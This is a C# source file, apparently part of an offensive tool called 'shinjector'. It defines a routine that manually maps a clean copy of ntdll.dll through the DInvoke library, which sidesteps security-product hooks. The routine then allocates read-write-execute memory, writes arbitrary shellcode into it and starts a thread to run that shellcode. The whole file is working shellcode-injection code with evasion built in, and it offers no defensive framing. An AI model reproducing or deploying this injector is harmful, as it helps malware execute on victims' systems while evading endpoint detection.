using System;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;


namespace shinjector.Casos
{
    public class Manual_Mapping
    {
        public static void Inject(byte[] shellcode)
        {

            DInvoke.Data.PE.PE_MANUAL_MAP module = DInvoke.ManualMap.Map.MapModuleToMemory(@"C:\windows\system32\ntdll.dll");

            IntPtr baseAddress = IntPtr.Zero;
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, new IntPtr((long)shellcode.Length));

            object[] allocateMemory = { (IntPtr)(-1), baseAddress, IntPtr.Zero, lpValue, (uint)(0x00002000 | 0x00001000), (uint)0x40 };
           
            Generic.CallMappedDLLModuleExport(module.PEINFO, module.ModuleBase, "NtAllocateVirtualMemory",
                                                               typeof(Native.DELEGATES.NtAllocateVirtualMemory), allocateMemory, false);
            if ((IntPtr)allocateMemory[1] == IntPtr.Zero)
                return;

            baseAddress = (IntPtr)allocateMemory[1];
            IntPtr buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
            uint bytesWritten = 0;
            object[] writeMemory = { (IntPtr)(-1), baseAddress, buffer, (uint)shellcode.Length, bytesWritten };
            Generic.CallMappedDLLModuleExport(module.PEINFO, module.ModuleBase, "NtWriteVirtualMemory",
                                                   typeof(Native.DELEGATES.NtWriteVirtualMemory), writeMemory, false);

            IntPtr hthread = IntPtr.Zero;
            object[] createThread = { hthread,DInvoke.Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL, IntPtr.Zero, (IntPtr)(-1),
                                      baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
            Generic.CallMappedDLLModuleExport(module.PEINFO, module.ModuleBase, "NtCreateThreadEx",
                                              typeof(Native.DELEGATES.NtCreateThreadEx), createThread, false);
        }
    }
}
